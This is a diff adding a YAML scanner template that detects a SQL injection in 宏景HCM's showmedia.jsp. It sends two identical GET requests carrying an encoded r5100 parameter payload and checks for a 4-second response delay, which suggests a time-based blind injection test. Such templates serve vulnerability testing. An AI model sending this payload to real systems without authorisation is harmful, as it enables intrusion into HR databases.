@@ -1,0 +1,17 @@
+name: 宏景HCM-showmedia-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: GET
+    path: /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9fCPAATTP2HJFPAATTPTj2OLkwG
+    expression:
+      status: 200
+      sleep: 4
+  - method: GET
+    path: /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9fCPAATTP2HJFPAATTPTj2OLkwG
+    expression:
+      status: 200
+      sleep: 4
